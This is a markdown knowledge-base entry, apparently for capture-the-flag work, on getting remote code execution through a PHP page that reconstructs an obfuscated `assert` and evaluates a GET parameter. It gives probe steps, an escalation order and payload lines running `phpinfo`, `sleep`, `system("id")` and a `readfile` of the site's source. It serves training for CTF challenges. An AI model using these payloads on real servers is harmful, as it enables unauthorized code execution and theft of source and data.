# Obfuscated assert GET RCE

- Category: web
- Slug: obfuscated-assert-get-rce
- Created: 2026-03-28
- Status: active
- Tags: php, assert, rce, webshell, blank-page, obfuscation

## Chain Summary

- One-line chain: a minimal PHP page reconstructs `assert` dynamically and executes attacker-controlled code from a GET parameter.
- Typical target shape: the application returns a blank page by default, but one overlooked parameter turns the page into direct PHP code execution.

## Preconditions

- PHP version still treats `assert("string")` as executable PHP code.
- The application passes attacker-controlled input into `assert`.
- No filter blocks dangerous PHP functions such as `system`, `passthru`, `readfile`, or `phpinfo`.

## Cheap Probes

- Test likely short parameter names such as `s`, `a`, `c`, `x`, `cmd`, `code`.
- Use `phpinfo();` first because it gives a high-signal visible response.
- Use `sleep(3);` to confirm blind code execution if no output appears.
- Use `system("id");` only after a positive code-execution signal.

## Telltale Evidence

- `/` or `/index.php` returns `200 OK` with an empty body.
- Source, hints, or recovered snippets show dynamic string assembly such as `"a#s#s#e#r#t"` followed by `explode` and concatenation.
- `phpinfo();` or `var_dump(233);` suddenly converts a blank page into visible output.

## Escalation Order

1. Try `?s=phpinfo();` or the most likely short parameter name.
2. If output stays blank, try `sleep(3);` to check blind execution.
3. Confirm shell access with `system("id");`.
4. Read source with `readfile("/var/www/html/index.php");`.
5. Enumerate for flag files with shell commands or PHP filesystem functions.

## Common Mistakes

- Fuzzing many parameter names but missing the shortest one.
- Testing only shell commands and missing easier probes like `phpinfo();`.
- Assuming a blank page means no execution path exists.
- Forgetting that old PHP `assert()` executes strings as PHP code.

## Payload Shapes

```text
?s=phpinfo();
?s=sleep(3);
?s=system("id");
?s=readfile("/var/www/html/index.php");
```

## Related Writeups

- `knowledge/writeups/web/171-80-2-169-18148.md`

## Skill Impact

- Related skill: none yet
- Rule to add or update: create a future generic web backdoor triage skill that includes short-parameter `assert` probes for blank PHP pages.
